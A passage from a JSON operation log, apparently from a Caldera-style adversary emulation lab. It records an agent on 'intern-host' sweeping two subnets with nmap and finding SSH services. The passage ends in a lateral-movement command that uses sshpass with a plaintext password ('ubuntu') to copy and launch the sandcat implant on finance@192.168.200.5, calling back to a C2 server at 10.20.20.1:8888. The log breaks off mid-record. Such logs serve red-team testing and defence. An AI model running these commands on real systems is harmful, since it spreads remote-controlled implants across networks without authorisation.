"deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:13:21Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["b50f077a-e985-4058-aa9f-c3a1f23ab450", "f3605b9e-b642-4a08-b652-2b4c0e140fe4", "7e51a4e3-b4f0-4271-86e0-92bc8ef16bda", "97784018-c6e6-41fb-9376-7a51cc987e13", "967a21f4-6081-48c4-b87e-fe4a2857c58a"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.0/24", "unique": "host.subnet.ipaddrs192.168.200.0/24", "created": "2023-10-03T20:13:23Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.6', '192.168.200.7', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7', '192.168.200.3'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["b50f077a-e985-4058-aa9f-c3a1f23ab450"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["192.168.200.1", "192.168.200.2", "192.168.200.3", "192.168.200.4", "192.168.200.5", "192.168.200.6", "192.168.200.7"], "unique": "host.subnet.online_ipaddrs['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7']", "created": "2023-10-03T20:13:23Z", "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.1', '192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5', '192.168.200.6', '192.168.200.7'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:13:21Z"}, {"deadman": false, "finish": "2023-10-03T20:13:52Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "7fae9c88-85a3-4f91-8843-22fcf67e7bc9", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "used": [{"trait": "scan.subnet.addr", "links": [], "collected_by": [], "score": 2, "limit_count": -1, "name": "scan.subnet.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "scan.subnet.addr192.168.201.0/24", "created": "2023-10-03T20:13:25Z", "relationships": []}], "unique": "7fae9c88-85a3-4f91-8843-22fcf67e7bc9", "decide": "2023-10-03T20:13:25Z", "status": 0, "score": 1, "pid": "1801", "relationships": [{"target": {"trait": "host.subnet.online_ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": null, "origin_type": null, "source": null, "value": [], "unique": "host.subnet.online_ipaddrs[]", "created": "2023-10-03T20:13:52Z", "relationships": []}, "source": {"trait": "host.subnet.ipaddrs", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:13:52Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_online_ipaddrs", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe720b58190>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7fe720b59f30>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmapsubnet", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.subnet.online_ipaddrs", "edge": "has_online_ipaddrs", "source": "host.subnet.ipaddrs"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:13:32Z", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "facts": [{"trait": "host.subnet.ipaddrs", "links": ["7fae9c88-85a3-4f91-8843-22fcf67e7bc9", "b05e5c86-e4e0-4d5a-a972-daed017342e5", "b43433c3-093f-4b91-ab70-de1a8aaa55c0", "8b1f42bd-70cd-4abb-8600-a4c1241cb66d", "8f0da59b-e3d7-4006-85b4-5ae6561c9726"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.subnet.ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-03T20:13:52Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:13:32Z"}, {"deadman": false, "finish": "2023-10-03T20:14:21Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "337122c1-c809-4976-84da-6be26d69d031", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,5,6,7", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 11, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.1,2,3,4,5,6,7", "unique": "scan.remote.addr192.168.200.1,2,3,4,5,6,7", "created": "2023-10-03T20:13:55Z", "relationships": []}], "unique": "337122c1-c809-4976-84da-6be26d69d031", "decide": "2023-10-03T20:13:55Z", "status": 0, "score": 1, "pid": "1804", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208bb4c0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208bbf40>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b8160>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b8280>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b90f0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208bb310>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b9d80>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208ba6b0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b8d00>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b8100>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["4444", "krb524"], ["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('4444', 'krb524'), ('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b96c0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208bbc70>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b9000>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b8520>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["8000", "ssh"], ["4444", "krb524"], ["22", "ssh"]], "unique": "host.remote.port_services[('8000', 'ssh'), ('4444', 'krb524'), ('22', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b9240>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208bb910>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208baf20>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b8430>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:14:21Z", "relationships": []}, "origin": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b9810>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe7208b8370>", "score": 1}], "host": "intern-host", "pin": 0, "paw": "piiiry", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-03T20:14:01Z", "command": "nmap -sV --version-light -oX - 192.168.200.1,2,3,4,5,6,7", "facts": [{"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "4444", "8000"], "unique": "host.remote.ports['22', '4444', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444', '8000'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["337122c1-c809-4976-84da-6be26d69d031"], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["4444", "krb524"], ["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('4444', 'krb524'), ('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524'), ('8000', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["337122c1-c809-4976-84da-6be26d69d031", "69a3fef6-2501-42c2-9644-51cf5f5541bd", "5f77a35b-9898-4f66-9e9e-fb18ec902538", "7bc3740f-9c8b-4c43-b4a8-02e6e383f037", "6f32ec22-51a1-4274-9e0c-6091b6e27369"], "collected_by": ["piiiry", "hchyiu", "xuyzjc", "sucxhr", "tvtjgt"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-03T20:14:21Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-03T20:14:01Z"}, {"deadman": false, "finish": "2023-10-03T20:14:41Z", "executor": {"additional_info": {}, "timeout": 15, "variations": [], "payloads": ["sandcat.go-linux"], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "sshpass -p \"#{host.lateralMove.password}\" scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && sshpass -p \"#{host.lateralMove.password}\" ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "platform": "linux", "parsers": [], "uploads": [], "language": null}, "cleanup": 0, "id": "cd3ab914-de57-4906-88d9-f4caefff034f", "plaintext_command": "sshpass -p \"ubuntu\" scp -P 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux finance@192.168.200.5:~/sandcat.go && sshpass -p \"ubuntu\" ssh -p 8000 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 finance@192.168.200.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "used": [{"trait": "host.lateralMove.password", "links": [], "collected_by": ["piiiry"], "score": 1, "limit_count": -1, "name": "host.lateralMove.password", "technique_id": null, "origin_type": null, "source": "fc497e46-a9f7-4c45-a08d-58f1f1f64211", "value": "ubuntu", "unique": 